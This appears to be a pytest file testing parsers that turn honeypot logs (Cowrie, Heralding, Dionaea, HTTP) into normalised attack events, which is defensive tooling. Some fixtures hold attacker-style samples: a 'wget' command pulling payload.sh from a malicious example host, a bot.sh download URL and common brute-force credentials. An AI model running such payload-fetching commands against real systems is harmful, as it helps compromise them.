"""Tests for honeypot event parsers."""
import pytest
from datetime import datetime, timezone

from meli.ingest.parsers.cowrie import CowrieParser
from meli.ingest.parsers.heralding import HeraldingParser
from meli.ingest.parsers.dionaea import DionaeaParser
from meli.ingest.parsers.http_honeypot import HttpHoneypotParser
from meli.ingest.parsers.generic_json import GenericJsonParser


class TestCowrieParser:
    def setup_method(self):
        self.parser = CowrieParser()

    def test_parse_login_failed(self):
        raw = {
            "eventid": "cowrie.login.failed",
            "src_ip": "192.168.1.100",
            "src_port": 54321,
            "username": "root",
            "password": "123456",
            "session": "abc123",
            "timestamp": "2024-01-15T12:00:00.000000Z",
        }
        result = self.parser.parse(raw)
        assert result is not None
        assert result["source_ip"] == "192.168.1.100"
        assert result["username"] == "root"
        assert result["password"] == "123456"
        assert result["action_type"] == "login_attempt"
        assert result["honeypot_service"] == "cowrie"

    def test_parse_login_success(self):
        raw = {
            "eventid": "cowrie.login.success",
            "src_ip": "10.0.0.1",
            "username": "admin",
            "password": "password123",
            "session": "sess456",
            "timestamp": "2024-01-15T12:00:00Z",
        }
        result = self.parser.parse(raw)
        assert result is not None
        assert result["action_type"] == "successful_auth"

    def test_parse_command_input(self):
        raw = {
            "eventid": "cowrie.command.input",
            "src_ip": "203.0.113.5",
            "input": "wget http://malicious.example.com/payload.sh",
            "session": "sess789",
            "timestamp": "2024-01-15T12:01:00Z",
        }
        result = self.parser.parse(raw)
        assert result is not None
        assert result["action_type"] == "command"
        assert "wget" in result["command"]

    def test_parse_file_download(self):
        raw = {
            "eventid": "cowrie.session.file_download",
            "src_ip": "198.51.100.1",
            "url": "http://evil.example/bot.sh",
            "shasum": "abc123def456",
            "filename": "/tmp/bot.sh",
            "session": "dl_session",
            "timestamp": "2024-01-15T12:02:00Z",
        }
        result = self.parser.parse(raw)
        assert result is not None
        assert result["action_type"] == "file_download"
        assert result["payload_hash"] == "abc123def456"

    def test_returns_none_for_empty(self):
        result = self.parser.parse({})
        # Should return a result or None, not crash
        # Empty dict has no src_ip so _parse_generic returns None
        assert result is None


class TestHeraldingParser:
    def setup_method(self):
        self.parser = HeraldingParser()

    def test_parse_ssh_login(self):
        raw = {
            "source_ip": "10.1.2.3",
            "source_port": 43210,
            "destination_port": 22,
            "username": "root",
            "password": "toor",
            "auth_success": False,
        }
        result = self.parser.parse(raw)
        assert result is not None
        assert result["source_ip"] == "10.1.2.3"
        assert result["transport"] == "ssh"
        assert result["action_type"] == "login_attempt"

    def test_parse_ftp_login(self):
        raw = {
            "source_ip": "172.16.0.5",
            "destination_port": 21,
            "username": "anonymous",
            "password": "user@example.com",
        }
        result = self.parser.parse(raw)
        assert result is not None
        assert result["transport"] == "ftp"

    def test_returns_none_without_ip(self):
        result = self.parser.parse({"destination_port": 22})
        assert result is None


class TestDionaeaParser:
    def setup_method(self):
        self.parser = DionaeaParser()

    def test_parse_smb_connection(self):
        raw = {
            "src_ip": "192.0.2.10",
            "src_port": 49152,
            "proto": "dionaea.services.smb",
            "connection": "conn001",
            "timestamp": "2024-01-15T12:00:00Z",
        }
        result = self.parser.parse(raw)
        assert result is not None
        assert result["transport"] == "smb"
        assert result["destination_port"] == 445

    def test_parse_with_payload(self):
        raw = {
            "src_ip": "198.51.100.20",
            "proto": "dionaea.services.ftp",
            "sha256": "deadbeef" * 8,
        }
        result = self.parser.parse(raw)
        assert result is not None
        assert result["action_type"] == "file_upload"


class TestHttpHoneypotParser:
    def setup_method(self):
        self.parser = HttpHoneypotParser()

    def test_parse_web_request(self):
        raw = {
            "remote_addr": "203.0.113.100",
            "method": "GET",
            "path": "/wp-admin/admin-ajax.php",
            "user_agent": "Mozilla/5.0 (compatible; Googlebot)",
            "server_port": 80,
        }
        result = self.parser.parse(raw)
        assert result is not None
        assert result["source_ip"] == "203.0.113.100"
        assert "GET" in result["command"]
        assert result["action_type"] == "web_request"

    def test_returns_none_without_ip(self):
        result = self.parser.parse({"method": "GET", "path": "/"})
        assert result is None


class TestGenericJsonParser:
    def setup_method(self):
        self.parser = GenericJsonParser()

    def test_parse_canonical_format(self):
        raw = {
            "timestamp": "2024-01-15T12:00:00Z",
            "network": {
                "source_ip": "10.0.0.1",
                "source_port": 12345,
                "destination_port": 22,
                "protocol": "tcp",
            },
            "honeypot": {"type": "cowrie"},
            "action": {
                "type": "login_attempt",
                "details": {"username": "admin", "password": "admin"},
            },
        }
        result = self.parser.parse(raw)
        assert result is not None
        assert result["source_ip"] == "10.0.0.1"
        assert result["username"] == "admin"

    def test_parse_heuristic_format(self):
        raw = {
            "ip": "192.168.1.1",
            "service": "ssh",
            "event_type": "brute_force",
            "user": "root",
            "pass": "password",
        }
        result = self.parser.parse(raw)
        assert result is not None
        assert result["source_ip"] == "192.168.1.1"
        assert result["username"] == "root"

    def test_returns_none_without_ip(self):
        result = self.parser.parse({"service": "ssh"})
        assert result is None
